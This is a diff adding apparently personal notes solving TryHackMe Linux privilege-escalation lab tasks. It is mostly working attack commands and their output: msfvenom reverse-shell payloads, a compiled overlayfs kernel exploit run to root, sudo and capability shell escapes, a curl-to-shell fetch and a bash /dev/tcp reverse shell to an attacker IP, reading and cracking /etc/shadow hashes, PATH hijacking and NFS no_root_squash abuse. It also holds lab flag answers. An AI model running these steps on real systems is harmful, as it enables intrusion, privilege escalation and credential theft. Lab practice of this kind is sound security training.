@@ -1,0 +1,334 @@
+149 110 894
+xus7ma1g
+
+
+https://medium.com/@jiteshofficial2004/tryhackme-metasploit-exploitation-easy-walkthrough-48d6db20cfbf
+
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.52.16 LPORT=1234 -f elf > rev_shell.elf
+or msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.11.52.16 LPORT=1235 -f elf > rev.elf
+
+
+    find . -name flag1.txt: find the file named “flag1.txt” in the current directory
+    find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
+    find / -type d -name config: find the directory named config under “/”
+    find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
+    find / -perm a=x: find executable files
+    find /home -user frank: find all files for user “frank” under “/home”
+    find / -mtime 10: find files that were modified in the last 10 days
+    find / -atime 10: find files that were accessed in the last 10 day
+    find / -cmin -60: find files changed within the last hour (60 minutes)
+    find / -amin -60: find files accesses within the last hour (60 minutes)
+    find / -size 50M: find files with a 50 MB size
+
+#find files with the 777 permissions (files readable, writeable, and executable by all users)
+find / -type f -perm 0777
+
+#find executable files
+find / -perm a=x
+
+    find / -writable -type d 2>/dev/null : Find world-writeable folders
+    find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
+    find / -perm -o w -type d 2>/dev/null: Find world-writeable folders
+    
+    find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 
+    
+    
+ 
+
+searchsploit 3.13.0                                  
+---------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                      |  Path
+---------------------------------------------------------------------------------------------------- ---------------------------------
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalatio | linux/local/37292.c
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalatio | linux/local/37293.txt
+---------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+
+searchsploit -m linux/local/37292.c
+
+gcc 37292.c -o 37292
+
+on room machine
+cd /tmp
+wget ...
+chmod +x 37292
+./37292
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# pwd
+/tmp
+# whoami   
+root
+# cat /home/matt/flag1.txt
+THM-28392872729920
+
+
+#Task 6 Privilege Escalation: Sudo 
+hint:
+https://gtfobins.github.io/gtfobins/find/
+
+sudo find . -exec /bin/sh \; -quit
+# find / -name flag2.txt 2>/dev/null
+/home/ubuntu/flag2.txt
+# cat /home/ubuntu/flag2.txt
+THM-402028394
+
+
+cat /etc/shadow | grep frank
+frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::
+
+
+#Task 7 Privilege Escalation: SUID 
+
+find / -type f -perm -04000 -ls 2>/dev/null will list files that have SUID or SGID bits set.
+find / -type f -perm -u=s 2> /dev/null
+
+https://github.com/liamg/traitor
+
+wget http://10.11.52.16:8000/linpeas.sh
+wget http://10.11.52.16:8000/lse.sh
+wget http://10.11.52.16:8000/privcheckerserver.py
+curl http://10.11.52.16:8000/lp.enc | base64 -d | sh
+./LinEnum.sh -t -k password
+
+/snap/core18/1885/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+/snap/core/10185/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                         
+
+LFILE=/etc/shadow
+karen@ip-10-10-159-77:/tmp$ base64 "$LFILE" | base64 --decode
+ubuntu:!:18796:0:99999:7:::
+gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
+user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
+lxd:!:18796::::::
+karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::
+
+
+vi user2
+$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/
+
+ john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt user2
+ Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Password1        (?)
+1g 0:00:00:10 DONE (2021-11-06 17:33) 0.09643g/s 345.6p/s 345.6c/s 345.6C/s girls..fresa
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+user2@ip-10-10-159-77:/tmp$ find / -name flag3.txt 2>/dev/null
+/home/ubuntu/flag3.txt
+user2@ip-10-10-159-77:/tmp$ LFILE=/home/ubuntu/flag3.txt
+user2@ip-10-10-159-77:/tmp$ base64 "$LFILE" | base64 --decode
+THM-3847834
+
+
+
+https://github.com/hakivvi/CVE-2021-3560
+https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
+compile
+apt install pkg-config
+apt install pkgconf
+apt install libdbus-glib-1-dev
+gcc -Wall exploit.c -o exploit $(pkg-config --libs --cflags dbus-1)
+
+openssl passwd -1 -salt THM Password1
+$1$THM$T5GbaVFIumCx94QUC3yLU1
+
+hacker:$1$THM$T5GbaVFIumCx94QUC3yLU1:0:0:/root:/bin/bash
+
+
+$ getcap -r / 2>/dev/null
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/home/karen/vim = cap_setuid+ep
+/home/ubuntu/view = cap_setuid+ep
+$ ls -l /usr/bin/vim
+lrwxrwxrwx 1 root root 21 Oct 26  2020 /usr/bin/vim -> /etc/alternatives/vim
+$ ls /home/karen/vim
+/home/karen/vim
+$ id
+uid=1001(karen) gid=1001(karen) groups=1001(karen)
+
+
+#Task 8 Privilege Escalation: Capabilities 
+
+$ which python4
+$ which python3
+/usr/bin/python3
+$ ls -als
+total 2856
+   4 drwxrwxrwx 3 root  root     4096 Jun 18 11:51 .
+   4 drwxr-xr-x 4 root  root     4096 Jun 18 11:45 ..
+   4 drwx------ 2 karen karen    4096 Jun 18 11:48 .cache
+   4 -rw------- 1 karen karen     556 Jun 18 11:51 .viminfo
+2840 -rwxr-xr-x 1 root  root  2906824 Jun 18 11:46 vim
+
+$ ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+Erase is control-H (^H).
+# pwd
+/home/karen
+# whoami
+root
+# find / -name flag4.txt 2>/dev/null
+/home/ubuntu/flag4.txt
+# pwd
+/home/karen
+# cat /home/ubuntu/flag4.txt
+THM-9349843
+
+
+#Task 9 Privilege Escalation: Cron Jobs 
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.11.52.16/1234 0>&1
+
+
+nc -lnvp 1234
+THM-383000283
+
+cat /etc/shadow | grep matt
+matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7
+
+
+test.py
+#!/usr/bin/env python3
+import os
+import sys
+try:
+   os.system( 'chmod u+s /bin/bash')
+except:
+    sys.exit()
+
+####
+
+After waiting two minute
+
+whoami
+/bin/bash -p
+whoami
+root
+
+#python -c 'import pty; pty.spawn("/bin/bash")'
+
+cat /etc/passwd > local_passwd
+cat /etc/passwd > local_shadow
+unshadow local_passwd local_shadow > unshadowed.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
+
+https://tryhackme.com/room/johntheripper0
+
+
+#Task 10 Privilege Escalation: PATH
+hint: find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+echo $PATH
+export PATH=/tmp:$PATH
+vi test.c
+####
+#include <unistd.h>
+void main()
+{ setuid(0);
+setgid(0);
+system("thm");
+}
+####
+
+gcc test.c -o test -w
+
+cd /tmp
+echo "/bin/bash" >thm
+chmod 777 thm
+ls -l thm
+karen@ip-10-10-16-21:/home/murdoch$ ./test
+THM-736628929
+
+
+#Task11
+On victime
+cat /etc/exports 
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+
+on kali machine
+showmount -e 10.10.145.64
+Export list for 10.10.145.64:
+/home/ubuntu/sharedfolder *
+/tmp                      *
+/home/backup              *
+                                                                                                                                                        
+┌──(root💀lucy)-[/home/gd/Desktop/THM/LinuxPriesc]
+└─# mkdir /tmp/backit          
+                                                                                                                                                        
+┌──(root💀lucy)-[/home/gd/Desktop/THM/LinuxPriesc]
+└─# mount -o rw 10.10.145.64:/home/ubuntu/sharedfolder /tmp/backit
+
+On Victim
+karen@ip-10-10-145-64:/home/ubuntu/sharedfolder$ ls
+nfs  nfs.c
+karen@ip-10-10-145-64:/home/ubuntu/sharedfolder$ ls -als
+total 28
+ 4 drwxr-xr-x 2 root   root    4096 Nov  4 16:36 .
+ 4 drwxr-xr-x 5 ubuntu ubuntu  4096 Jun 20 18:17 ..
+16 -rwsr-sr-x 1 root   root   16144 Nov  4 16:36 nfs
+ 4 -rw-r--r-- 1 root   root      70 Nov  4 16:36 nfs.c
+karen@ip-10-10-145-64:/home/ubuntu/sharedfolder$ ./nfs
+root@ip-10-10-145-64:/home/ubuntu/sharedfolder# find / -name flag7.txt 2>/dev/null
+/home/matt/flag7.txt
+root@ip-10-10-145-64:/home/ubuntu/sharedfolder# cat /home/matt/flag7.txt 
+THM-89384012
+root@ip-10-10-145-64:/home/ubuntu/sharedfolder# 
+
+
+#Task 12 Capstone Challenge 
+LFILE=/etc/shadow
+base64 "$LFILE" | base64 --decode
+...
+root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
+...
+leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
+missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
+
+
+on kali
+vi missy
+$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/
+
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt missy 
+pass: 
+su missy
+cat /home/missy/flag1.txt
+THM-42828719920544
+
+[missy@ip-10-10-5-210 ~]$ LFILE=/home/rootflag/flag2.txt
+[missy@ip-10-10-5-210 ~]$ base64 "$LFILE" | base64 --decode
+ THM-168824782390238
+
+https://tryhackme.com/room/linprivesc
+https://www.poplabsec.com/tryhackme-linux-privesc-writeup/
+https://666isildur.gitbook.io/ethical-hacking/tryhackme/linux-fundamentals/common-linux-privesc
+https://macrosec.tech/index.php/2021/06/08/linux-privilege-escalation-techniques-using-suid/
+https://github.com/zweilosec/Infosec-Notes/blob/master/linux-1/linux-redteam/privilege-escalation.md
+https://pythonrepo.com/repo/Almorabea-Polkit-exploit
+https://www.vulnhub.com/entry/kioptrix-level-1-1,22/
+
